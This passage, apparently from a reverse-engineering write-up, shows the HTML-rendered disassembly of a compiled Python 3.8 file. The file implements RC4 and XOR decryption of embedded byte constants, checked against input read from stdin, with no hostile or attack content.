class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br></pre></td><td class="code"><pre><span class="line">res.pyc (Python <span class="number">3.8</span>)</span><br><span class="line">[Code]</span><br><span class="line">    File Name: main.py</span><br><span class="line">    Object Name: &lt;module&gt;</span><br><span class="line">    Arg Count: <span class="number">0</span></span><br><span class="line">    Pos Only Arg Count: <span class="number">0</span></span><br><span class="line">    KW Only Arg Count: <span class="number">0</span></span><br><span class="line">    Locals: <span class="number">0</span></span><br><span class="line">    Stack Size: <span class="number">7</span></span><br><span class="line">    Flags: <span class="number">0x00000040</span> (CO_NOFREE)</span><br><span class="line">    [Names]</span><br><span class="line">        <span class="string">&#x27;sys&#x27;</span></span><br><span class="line">        <span class="string">&#x27;hashlib&#x27;</span></span><br><span class="line">        <span class="string">&#x27;sha256&#x27;</span></span><br><span class="line">        <span class="string">&#x27;KSA&#x27;</span></span><br><span class="line">        <span class="string">&#x27;PRGA&#x27;</span></span><br><span class="line">        <span class="string">&#x27;RC4&#x27;</span></span><br><span class="line">        <span class="string">&#x27;xor&#x27;</span></span><br><span class="line">        <span class="string">&#x27;__name__&#x27;</span></span><br><span class="line">        <span class="string">&#x27;w&#x27;</span></span><br><span class="line">        <span class="string">&#x27;e&#x27;</span></span><br><span class="line">        <span class="string">&#x27;b&#x27;</span></span><br><span class="line">        <span class="string">&#x27;s&#x27;</span></span><br><span class="line">        <span class="string">&#x27;t&#x27;</span></span><br><span class="line">        <span class="string">&#x27;m&#x27;</span></span><br><span class="line">        <span class="string">&#x27;n&#x27;</span></span><br><span class="line">        <span class="string">&#x27;list&#x27;</span></span><br><span class="line">        <span class="string">&#x27;map&#x27;</span></span><br><span class="line">        <span class="string">&#x27;sorted&#x27;</span></span><br><span class="line">        <span class="string">&#x27;items&#x27;</span></span><br><span class="line">        <span class="string">&#x27;stream&#x27;</span></span><br><span class="line">        <span class="string">&#x27;print&#x27;</span></span><br><span class="line">        <span class="string">&#x27;decode&#x27;</span></span><br><span class="line">        <span class="string">&#x27;stdin&#x27;</span></span><br><span class="line">        <span class="string">&#x27;buffer&#x27;</span></span><br><span class="line">        <span class="string">&#x27;read&#x27;</span></span><br><span class="line">        <span class="string">&#x27;p&#x27;</span></span><br><span class="line">        <span class="string">&#x27;c&#x27;</span></span><br><span class="line">        <span class="string">&#x27;digest&#x27;</span></span><br><span class="line">    [Var Names]</span><br><span class="line">    [Free Vars]</span><br><span class="line">    [Cell Vars]</span><br><span class="line">    [Constants]</span><br><span class="line">        <span class="number">0</span></span><br><span class="line">        <span class="literal">None</span></span><br><span class="line">        (</span><br><span class="line">            <span class="string">&#x27;sha256&#x27;</span></span><br><span class="line">        )</span><br><span class="line">        [Code]</span><br><span class="line">            File Name: main.py</span><br><span class="line">            Object Name: KSA</span><br><span class="line">            Arg Count: <span class="number">1</span></span><br><span class="line">            Pos Only Arg Count: <span class="number">0</span></span><br><span class="line">            KW Only Arg Count: <span class="number">0</span></span><br><span class="line">            Locals: <span class="number">5</span></span><br><span class="line">            Stack Size: <span class="number">5</span></span><br><span class="line">            Flags: <span class="number">0x00000043</span> (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)</span><br><span class="line">            [Names]</span><br><span class="line">                <span class="string">&#x27;len&#x27;</span></span><br><span class="line">                <span class="string">&#x27;list&#x27;</span></span><br><span class="line">                <span class="string">&#x27;range&#x27;</span></span><br><span class="line">            [Var Names]</span><br><span class="line">                <span class="string">&#x27;key&#x27;</span></span><br><span class="line">                <span class="string">&#x27;keylength&#x27;</span></span><br><span class="line">                <span class="string">&#x27;S&#x27;</span></span><br><span class="line">                <span class="string">&#x27;j&#x27;</span></span><br><span class="line">                <span class="string">&#x27;i&#x27;</span></span><br><span class="line">            [Free Vars]</span><br><span class="line">            [Cell Vars]</span><br><span class="line">            [Constants]</span><br><span class="line">                <span class="literal">None</span></span><br><span class="line">                <span class="number">256</span></span><br><span class="line">                <span class="number">0</span></span><br><span class="line">            [Disassembly]</span><br><span class="line">                <span class="number">0</span>       LOAD_GLOBAL             <span class="number">0</span>: <span class="built_in">len</span></span><br><span class="line">                <span class="number">2</span>       LOAD_FAST               <span class="number">0</span>: key</span><br><span class="line">                <span class="number">4</span>       CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">                <span class="number">6</span>       STORE_FAST              <span class="number">1</span>: keylength</span><br><span class="line">                <span class="number">8</span>       LOAD_GLOBAL             <span class="number">1</span>: <span class="built_in">list</span></span><br><span class="line">                <span class="number">10</span>      LOAD_GLOBAL             <span class="number">2</span>: <span class="built_in">range</span></span><br><span class="line">                <span class="number">12</span>      LOAD_CONST              <span class="number">1</span>: <span class="number">256</span></span><br><span class="line">                <span class="number">14</span>      CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">                <span class="number">16</span>      CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">                <span class="number">18</span>      STORE_FAST              <span class="number">2</span>: S</span><br><span class="line">                <span class="number">20</span>      LOAD_CONST              <span class="number">2</span>: <span class="number">0</span></span><br><span class="line">                <span class="number">22</span>      STORE_FAST              <span class="number">3</span>: j</span><br><span class="line">                <span class="number">24</span>      LOAD_GLOBAL             <span class="number">2</span>: <span class="built_in">range</span></span><br><span class="line">                <span class="number">26</span>      LOAD_CONST              <span class="number">1</span>: <span class="number">256</span></span><br><span class="line">                <span class="number">28</span>      CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">                <span class="number">30</span>      GET_ITER                </span><br><span class="line">                <span class="number">32</span>      FOR_ITER                <span class="number">29</span> (to <span class="number">63</span>)</span><br><span class="line">                <span class="number">34</span>      STORE_FAST              <span class="number">4</span>: i</span><br><span class="line">                <span class="number">36</span>      LOAD_FAST               <span class="number">3</span>: j</span><br><span class="line">                <span class="number">38</span>      LOAD_FAST               <span class="number">2</span>: S</span><br><span class="line">                <span class="number">40</span>      LOAD_FAST               <span class="number">4</span>: i</span><br><span class="line">                <span class="number">42</span>      BINARY_SUBSCR           </span><br><span class="line">                <span class="number">44</span>      BINARY_ADD              </span><br><span class="line">                <span class="number">46</span>      LOAD_FAST               <span class="number">0</span>: key</span><br><span class="line">                <span class="number">48</span>      LOAD_FAST               <span class="number">4</span>: i</span><br><span class="line">                <span class="number">50</span>      LOAD_FAST               <span class="number">1</span>: keylength</span><br><span class="line">                <span class="number">52</span>      BINARY_MODULO           </span><br><span class="line">                <span class="number">54</span>      BINARY_SUBSCR           </span><br><span class="line">                <span class="number">56</span>      BINARY_ADD              </span><br><span class="line">                <span class="number">58</span>      LOAD_CONST              <span class="number">1</span>: <span class="number">256</span></span><br><span class="line">                <span class="number">60</span>      BINARY_MODULO           </span><br><span class="line">                <span class="number">62</span>      STORE_FAST              <span class="number">3</span>: j</span><br><span class="line">                <span class="number">64</span>      LOAD_FAST               <span class="number">2</span>: S</span><br><span class="line">                <span class="number">66</span>      LOAD_FAST               <span class="number">3</span>: j</span><br><span class="line">                <span class="number">68</span>      BINARY_SUBSCR           </span><br><span class="line">                <span class="number">70</span>      LOAD_FAST               <span class="number">2</span>: S</span><br><span class="line">                <span class="number">72</span>      LOAD_FAST               <span class="number">4</span>: i</span><br><span class="line">                <span class="number">74</span>      BINARY_SUBSCR           </span><br><span class="line">                <span class="number">76</span>      ROT_TWO                 </span><br><span class="line">                <span class="number">78</span>      LOAD_FAST               <span class="number">2</span>: S</span><br><span class="line">                <span class="number">80</span>      LOAD_FAST               <span class="number">4</span>: i</span><br><span class="line">                <span class="number">82</span>      STORE_SUBSCR            </span><br><span class="line">                <span class="number">84</span>      LOAD_FAST               <span class="number">2</span>: S</span><br><span class="line">                <span class="number">86</span>      LOAD_FAST               <span class="number">3</span>: j</span><br><span class="line">                <span class="number">88</span>      STORE_SUBSCR            </span><br><span class="line">                <span class="number">90</span>      JUMP_ABSOLUTE           <span class="number">16</span></span><br><span class="line">                <span class="number">92</span>      LOAD_FAST               <span class="number">2</span>: S</span><br><span class="line">                <span class="number">94</span>      RETURN_VALUE            </span><br><span class="line">        <span class="string">&#x27;KSA&#x27;</span></span><br><span class="line">        [Code]</span><br><span class="line">            File Name: main.py</span><br><span class="line">            Object Name: PRGA</span><br><span class="line">            Arg Count: <span class="number">1</span></span><br><span class="line">            Pos Only Arg Count: <span class="number">0</span></span><br><span class="line">            KW Only Arg Count: <span class="number">0</span></span><br><span class="line">            Locals: <span class="number">4</span></span><br><span class="line">            Stack Size: <span class="number">4</span></span><br><span class="line">            Flags: <span class="number">0x00000063</span> (CO_OPTIMIZED | CO_NEWLOCALS | CO_GENERATOR | CO_NOFREE)</span><br><span class="line">            [Names]</span><br><span class="line">            [Var Names]</span><br><span class="line">                <span class="string">&#x27;S&#x27;</span></span><br><span class="line">                <span class="string">&#x27;i&#x27;</span></span><br><span class="line">                <span class="string">&#x27;j&#x27;</span></span><br><span class="line">                <span class="string">&#x27;K&#x27;</span></span><br><span class="line">            [Free Vars]</span><br><span class="line">            [Cell Vars]</span><br><span class="line">            [Constants]</span><br><span class="line">                <span class="literal">None</span></span><br><span class="line">                <span class="number">0</span></span><br><span class="line">                <span class="literal">True</span></span><br><span class="line">                <span class="number">1</span></span><br><span class="line">                <span class="number">256</span></span><br><span class="line">            [Disassembly]</span><br><span class="line">                <span class="number">0</span>       &lt;INVALID&gt;               </span><br><span class="line">                <span class="number">2</span>       LOAD_CONST              <span class="number">1</span>: <span class="number">0</span></span><br><span class="line">                <span class="number">4</span>       STORE_FAST              <span class="number">1</span>: i</span><br><span class="line">                <span class="number">6</span>       LOAD_CONST              <span class="number">1</span>: <span class="number">0</span></span><br><span class="line">                <span class="number">8</span>       STORE_FAST              <span class="number">2</span>: j</span><br><span class="line">                <span class="number">10</span>      NOP                     </span><br><span class="line">                <span class="number">12</span>      LOAD_FAST               <span class="number">1</span>: i</span><br><span class="line">                <span class="number">14</span>      LOAD_CONST              <span class="number">3</span>: <span class="number">1</span></span><br><span class="line">                <span class="number">16</span>      BINARY_ADD              </span><br><span class="line">                <span class="number">18</span>      LOAD_CONST              <span class="number">4</span>: <span class="number">256</span></span><br><span class="line">                <span class="number">20</span>      BINARY_MODULO           </span><br><span class="line">                <span class="number">22</span>      STORE_FAST              <span class="number">1</span>: i</span><br><span class="line">                <span class="number">24</span>      LOAD_FAST               <span class="number">2</span>: j</span><br><span class="line">                <span class="number">26</span>      LOAD_FAST               <span class="number">0</span>: S</span><br><span class="line">                <span class="number">28</span>      LOAD_FAST               <span class="number">1</span>: i</span><br><span class="line">                <span class="number">30</span>      BINARY_SUBSCR           </span><br><span class="line">                <span class="number">32</span>      BINARY_ADD              </span><br><span class="line">                <span class="number">34</span>      LOAD_CONST              <span class="number">4</span>: <span class="number">256</span></span><br><span class="line">                <span class="number">36</span>      BINARY_MODULO           </span><br><span class="line">                <span class="number">38</span>      STORE_FAST              <span class="number">2</span>: j</span><br><span class="line">                <span class="number">40</span>      LOAD_FAST               <span class="number">0</span>: S</span><br><span class="line">                <span class="number">42</span>      LOAD_FAST               <span class="number">2</span>: j</span><br><span class="line">                <span class="number">44</span>      BINARY_SUBSCR           </span><br><span class="line">                <span class="number">46</span>      LOAD_FAST               <span class="number">0</span>: S</span><br><span class="line">                <span class="number">48</span>      LOAD_FAST               <span class="number">1</span>: i</span><br><span class="line">                <span class="number">50</span>      BINARY_SUBSCR           </span><br><span class="line">                <span class="number">52</span>      ROT_TWO                 </span><br><span class="line">                <span class="number">54</span>      LOAD_FAST               <span class="number">0</span>: S</span><br><span class="line">                <span class="number">56</span>      LOAD_FAST               <span class="number">1</span>: i</span><br><span class="line">                <span class="number">58</span>      STORE_SUBSCR            </span><br><span class="line">                <span class="number">60</span>      LOAD_FAST               <span class="number">0</span>: S</span><br><span class="line">                <span class="number">62</span>      LOAD_FAST               <span class="number">2</span>: j</span><br><span class="line">                <span class="number">64</span>      STORE_SUBSCR            </span><br><span class="line">                <span class="number">66</span>      LOAD_FAST               <span class="number">0</span>: S</span><br><span class="line">                <span class="number">68</span>      LOAD_FAST               <span class="number">0</span>: S</span><br><span class="line">                <span class="number">70</span>      LOAD_FAST               <span class="number">1</span>: i</span><br><span class="line">                <span class="number">72</span>      BINARY_SUBSCR           </span><br><span class="line">                <span class="number">74</span>      LOAD_FAST               <span class="number">0</span>: S</span><br><span class="line">                <span class="number">76</span>      LOAD_FAST               <span class="number">2</span>: j</span><br><span class="line">                <span class="number">78</span>      BINARY_SUBSCR           </span><br><span class="line">                <span class="number">80</span>      BINARY_ADD              </span><br><span class="line">                <span class="number">82</span>      LOAD_CONST              <span class="number">4</span>: <span class="number">256</span></span><br><span class="line">                <span class="number">84</span>      BINARY_MODULO           </span><br><span class="line">                <span class="number">86</span>      BINARY_SUBSCR           </span><br><span class="line">                <span class="number">88</span>      STORE_FAST              <span class="number">3</span>: K</span><br><span class="line">                <span class="number">90</span>      LOAD_FAST               <span class="number">3</span>: K</span><br><span class="line">                <span class="number">92</span>      YIELD_VALUE             </span><br><span class="line">                <span class="number">94</span>      POP_TOP                 </span><br><span class="line">                <span class="number">96</span>      JUMP_ABSOLUTE           <span class="number">6</span></span><br><span class="line">        <span class="string">&#x27;PRGA&#x27;</span></span><br><span class="line">        [Code]</span><br><span class="line">            File Name: main.py</span><br><span class="line">            Object Name: RC4</span><br><span class="line">            Arg Count: <span class="number">1</span></span><br><span class="line">            Pos Only Arg Count: <span class="number">0</span></span><br><span class="line">            KW Only Arg Count: <span class="number">0</span></span><br><span class="line">            Locals: <span class="number">2</span></span><br><span class="line">            Stack Size: <span class="number">2</span></span><br><span class="line">            Flags: <span class="number">0x00000043</span> (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)</span><br><span class="line">            [Names]</span><br><span class="line">                <span class="string">&#x27;KSA&#x27;</span></span><br><span class="line">                <span class="string">&#x27;PRGA&#x27;</span></span><br><span class="line">            [Var Names]</span><br><span class="line">                <span class="string">&#x27;key&#x27;</span></span><br><span class="line">                <span class="string">&#x27;S&#x27;</span></span><br><span class="line">            [Free Vars]</span><br><span class="line">            [Cell Vars]</span><br><span class="line">            [Constants]</span><br><span class="line">                <span class="literal">None</span></span><br><span class="line">            [Disassembly]</span><br><span class="line">                <span class="number">0</span>       LOAD_GLOBAL             <span class="number">0</span>: KSA</span><br><span class="line">                <span class="number">2</span>       LOAD_FAST               <span class="number">0</span>: key</span><br><span class="line">                <span class="number">4</span>       CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">                <span class="number">6</span>       STORE_FAST              <span class="number">1</span>: S</span><br><span class="line">                <span class="number">8</span>       LOAD_GLOBAL             <span class="number">1</span>: PRGA</span><br><span class="line">                <span class="number">10</span>      LOAD_FAST               <span class="number">1</span>: S</span><br><span class="line">                <span class="number">12</span>      CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">                <span class="number">14</span>      RETURN_VALUE            </span><br><span class="line">        <span class="string">&#x27;RC4&#x27;</span></span><br><span class="line">        [Code]</span><br><span class="line">            File Name: main.py</span><br><span class="line">            Object Name: xor</span><br><span class="line">            Arg Count: <span class="number">2</span></span><br><span class="line">            Pos Only Arg Count: <span class="number">0</span></span><br><span class="line">            KW Only Arg Count: <span class="number">0</span></span><br><span class="line">            Locals: <span class="number">2</span></span><br><span class="line">            Stack Size: <span class="number">5</span></span><br><span class="line">            Flags: <span class="number">0x00000003</span> (CO_OPTIMIZED | CO_NEWLOCALS)</span><br><span class="line">            [Names]</span><br><span class="line">                <span class="string">&#x27;bytes&#x27;</span></span><br><span class="line">                <span class="string">&#x27;map&#x27;</span></span><br><span class="line">            [Var Names]</span><br><span class="line">                <span class="string">&#x27;p&#x27;</span></span><br><span class="line">                <span class="string">&#x27;stream&#x27;</span></span><br><span class="line">            [Free Vars]</span><br><span class="line">            [Cell Vars]</span><br><span class="line">                <span class="string">&#x27;stream&#x27;</span></span><br><span class="line">            [Constants]</span><br><span class="line">                <span class="literal">None</span></span><br><span class="line">                [Code]</span><br><span class="line">                    File Name: main.py</span><br><span class="line">                    Object Name: &lt;<span class="keyword">lambda</span>&gt;</span><br><span class="line">                    Arg Count: <span class="number">1</span></span><br><span class="line">                    Pos Only Arg Count: <span class="number">0</span></span><br><span class="line">                    KW Only Arg Count: <span class="number">0</span></span><br><span class="line">                    Locals: <span class="number">1</span></span><br><span class="line">                    Stack Size: <span class="number">3</span></span><br><span class="line">                    Flags: <span class="number">0x00000013</span> (CO_OPTIMIZED | CO_NEWLOCALS | CO_NESTED)</span><br><span class="line">                    [Names]</span><br><span class="line">                        <span class="string">&#x27;__next__&#x27;</span></span><br><span class="line">                    [Var Names]</span><br><span class="line">                        <span class="string">&#x27;x&#x27;</span></span><br><span class="line">                    [Free Vars]</span><br><span class="line">                        <span class="string">&#x27;stream&#x27;</span></span><br><span class="line">                    [Cell Vars]</span><br><span class="line">                    [Constants]</span><br><span class="line">                        <span class="literal">None</span></span><br><span class="line">                    [Disassembly]</span><br><span class="line">                        <span class="number">0</span>       LOAD_FAST               <span class="number">0</span>: x</span><br><span class="line">                        <span class="number">2</span>       LOAD_DEREF              <span class="number">0</span>: stream</span><br><span class="line">                        <span class="number">4</span>       LOAD_METHOD             <span class="number">0</span>: __next__</span><br><span class="line">                        <span class="number">6</span>       CALL_METHOD             <span class="number">0</span></span><br><span class="line">                        <span class="number">8</span>       BINARY_XOR              </span><br><span class="line">                        <span class="number">10</span>      RETURN_VALUE            </span><br><span class="line">                <span class="string">&#x27;xor.&lt;locals&gt;.&lt;lambda&gt;&#x27;</span></span><br><span class="line">            [Disassembly]</span><br><span class="line">                <span class="number">0</span>       LOAD_GLOBAL             <span class="number">0</span>: <span class="built_in">bytes</span></span><br><span class="line">                <span class="number">2</span>       LOAD_GLOBAL             <span class="number">1</span>: <span class="built_in">map</span></span><br><span class="line">                <span class="number">4</span>       LOAD_CLOSURE            <span class="number">0</span>: stream</span><br><span class="line">                <span class="number">6</span>       BUILD_TUPLE             <span class="number">1</span></span><br><span class="line">                <span class="number">8</span>       LOAD_CONST              <span class="number">1</span>: &lt;CODE&gt; &lt;<span class="keyword">lambda</span>&gt;</span><br><span class="line">                <span class="number">10</span>      LOAD_CONST              <span class="number">2</span>: <span class="string">&#x27;xor.&lt;locals&gt;.&lt;lambda&gt;&#x27;</span></span><br><span class="line">                <span class="number">12</span>      MAKE_FUNCTION           <span class="number">8</span></span><br><span class="line">                <span class="number">14</span>      LOAD_FAST               <span class="number">0</span>: p</span><br><span class="line">                <span class="number">16</span>      CALL_FUNCTION           <span class="number">2</span></span><br><span class="line">                <span class="number">18</span>      CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">                <span class="number">20</span>      RETURN_VALUE            </span><br><span class="line">        <span class="string">&#x27;xor&#x27;</span></span><br><span class="line">        <span class="string">&#x27;__main__&#x27;</span></span><br><span class="line">        <span class="string">b&#x27;\xf6\xef\x10H\xa9\x0f\x9f\xb5\x80\xc1xd\xae\xd3\x03\xb2\x84\xc2\xb4\x0e\xc8\xf3&lt;\x151\x19\n\x8f&#x27;</span></span><br><span class="line">        <span class="string">b&#x27;$\r9\xa3\x18\xddW\xc9\x97\xf3\xa7\xa8R~&#x27;</span></span><br><span class="line">        <span class="string">b&#x27;geo&#x27;</span></span><br><span class="line">        <span class="string">b&#x27;&#125;\xce`\xbej\xa2\x120\xb5\x8a\x94\x14&#123;\xa3\x86\xc8\xc7\x01\x98\xa3_\x91\xd8\x82T*V\xab\xe0\xa1\x141&#x27;</span></span><br><span class="line">        <span class="string">b&quot;Q_\xe2\xf8\x8c\x11M&#125;&#x27;&lt;@\xceT\xf6?_m\xa4\xf8\xb4\xea\xca\xc7:\xb9\xe6\x06\x8b\xeb\xfabH\x85xJ3$\xdd\xde\xb6\xdc\xa0\xb8b\x961\xb7\x13=\x17\x13\xb1&quot;</span></span><br><span class="line"> 